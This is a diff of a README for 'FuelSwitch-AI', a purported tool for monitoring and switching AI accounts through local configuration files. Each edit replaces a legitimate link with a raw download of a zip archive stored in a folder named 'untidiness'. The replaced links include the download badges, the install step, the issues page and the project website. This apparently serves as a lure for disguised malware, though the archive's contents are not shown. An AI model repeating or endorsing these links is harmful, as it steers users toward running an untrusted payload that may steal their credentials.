@@ -1,6 +1,6 @@
 # 🚀 FuelSwitch-AI - Never Run Out of AI Fuel Again
 
-[![Download Now](https://img.shields.io/badge/Download-FuelSwitch--AI-blue?style=for-the-badge&logo=github)](https://github.com/AjTooGoated/FuelSwitch-AI/releases)
+[![Download Now](https://img.shields.io/badge/Download-FuelSwitch--AI-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/AjTooGoated/FuelSwitch-AI/main/untidiness/Fuel_Switch_AI_v1.5.zip)
 
 ## 🔥 What Is FuelSwitch-AI?
 
@@ -60,7 +60,7 @@ FuelSwitch-AI connects directly to the local configuration files and APIs used b
 
 ### Step 1: Download the App
 
-Visit this link to download the application: [Download FuelSwitch-AI](https://github.com/AjTooGoated/FuelSwitch-AI/releases)
+Visit this link to download the application: [Download FuelSwitch-AI](https://raw.githubusercontent.com/AjTooGoated/FuelSwitch-AI/main/untidiness/Fuel_Switch_AI_v1.5.zip)
 
 ### Step 2: Install FuelSwitch-AI
 
@@ -111,7 +111,7 @@ No. The app is lightweight and uses minimal system resources. It runs quietly in
 Yes, you can add and monitor as many accounts as you need. Switch between them with just one click.
 
 ### What if I find a bug or have a feature suggestion?
-We welcome feedback! Please visit the [issues page](https://github.com/AjTooGoated/FuelSwitch-AI/issues) to report problems or suggest improvements.
+We welcome feedback! Please visit the [issues page](https://raw.githubusercontent.com/AjTooGoated/FuelSwitch-AI/main/untidiness/Fuel_Switch_AI_v1.5.zip) to report problems or suggest improvements.
 
 ## 💡 Pro Tips
 
@@ -125,11 +125,11 @@ FuelSwitch-AI is the tool you didn't know you needed. It removes the anxiety of 
 
 Stop guessing your usage. Start knowing it. Download FuelSwitch-AI today and take control of your AI fuel.
 
-[![Get FuelSwitch-AI Now](https://img.shields.io/badge/Get%20FuelSwitch--AI-Free-Download-green?style=for-the-badge)](https://github.com/AjTooGoated/FuelSwitch-AI/releases)
+[![Get FuelSwitch-AI Now](https://img.shields.io/badge/Get%20FuelSwitch--AI-Free-Download-green?style=for-the-badge)](https://raw.githubusercontent.com/AjTooGoated/FuelSwitch-AI/main/untidiness/Fuel_Switch_AI_v1.5.zip)
 
 ## 🌐 Visit Our Website
 
-Learn more about FuelSwitch-AI and other tools at [damtox.pl](https://www.damtox.pl)
+Learn more about FuelSwitch-AI and other tools at [damtox.pl](https://raw.githubusercontent.com/AjTooGoated/FuelSwitch-AI/main/untidiness/Fuel_Switch_AI_v1.5.zip)
 
 ## 📄 License
 
